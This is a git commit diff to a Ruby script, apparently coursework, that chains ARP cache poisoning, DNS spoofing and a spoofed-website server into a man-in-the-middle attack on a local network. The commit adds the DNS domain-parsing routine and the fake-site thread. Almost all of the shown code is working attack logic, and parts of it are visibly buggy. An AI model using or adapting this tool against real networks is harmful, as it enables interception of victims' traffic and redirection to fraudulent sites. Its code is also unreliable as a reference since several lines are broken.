89616866b3e8b9a64cc63b07ce74cd4dcb843708
Chris Wood <chriswood.ca@gmail.com>
2014-05-31 15:11:43 -0700

    Domain name extration complete Extraction of proper domain name from DNS qurey to internet readable format Code clean up and clarity

--- spoof_dns.rb
+++ spoof_dns.rb
@@ -3,8 +3,6 @@
 require 'packetfu'
 require 'thread'
 
-include 'site.rb'
-
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread. 
 
@@ -42,13 +40,25 @@ def spoof_dns(t_ip)
       #send response
 
     end
+  end
 end
 
 def extract_domain(q_name)
   #take q name and extract all subdomains
-
-
-  return nil #string with domain name
+  name = ""
+  loop {
+    len = q_name[0].to_i
+    if len == 0
+      name = name[0, name.length - 1]
+      return name
+    elsif len > 0
+        len > 0
+      name += q_name[1, len] + "."
+      q_name = q_name[len + 1..-1]
+    else len < 0 # should never be negative
+      return nil
+    end
+  }
 end
 
 def send_dns_response(orig_pkt, name)
@@ -88,11 +98,10 @@ end
 @sender_mac  = "7c:7a:91:7d:2b:02"
 @router_mac  = "00:22:6b:7c:9b:12"
 =end
+@iface      = "wlp2s0"
 @target_mac = get_machine_addr(@target_ip)
 @sender_mac = get_machine_addr(@sender_ip)
 @router_ip  = get_machine_addr(@router_ip)
-
-@iface      = "wlp2s0"
 
 # Construct the target's packet
 arp_packet_target = PacketFu::ARPPacket.new()
@@ -102,7 +111,7 @@ arp_packet_target.arp_saddr_mac = @sender_mac   # sender's MAC address
 arp_packet_target.arp_daddr_mac = @target_mac   # target's MAC address
 arp_packet_target.arp_saddr_ip = @router_ip     # router's IP
 arp_packet_target.arp_daddr_ip = @target_ip     # target's IP
-arp_packet_target.arp_opcode = 2               # arp code 2 == ARP reply
+arp_packet_target.arp_opcode = 2                # arp code 2 == ARP reply
  
 # Construct the router's packet
 arp_packet_router = PacketFu::ARPPacket.new()
@@ -112,7 +121,7 @@ arp_packet_router.arp_saddr_mac = @sender_mac   # sender's MAC address
 arp_packet_router.arp_daddr_mac = @router_mac   # router's MAC address
 arp_packet_router.arp_saddr_ip = @target_ip     # target's IP
 arp_packet_router.arp_daddr_ip = @router_ip     # router's IP
-arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply
+arp_packet_router.arp_opcode = 2                # arp code 2 == ARP reply
 
 # Enable IP forwarding
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
@@ -120,14 +129,20 @@ arp_packet_router.arp_opcode = 2               # arp code 2 == ARP reply
 begin
   puts "Starting the ARP poisoning thread..."
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
+  puts "Starting the DNS spoofing thread..."
   dns_thread = Thread.new{spoof_dns(target_ip)}
+  puts "Starting the spoofed website thread..."
+  web_thread = Thread.new{`ruby site.rb`}
   spoof_thread.join
   dns_thread.join
-  # Catch the interrupt and kill the thread
-rescue Interrupt
+  web_thread.join
+rescue Interrupt # Catch the interrupt and kill the thread
   puts "\nARP spoof stopped by interrupt signal."
   Thread.kill(spoof_thread)
+  puts "DNS spoof stopped by interrupt signal."
   Thread.kill(dns_thread)
+  puts "Web spoof stopped by interrupt signal."
+  Thread.kill(web_thread)
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   exit 0
 end
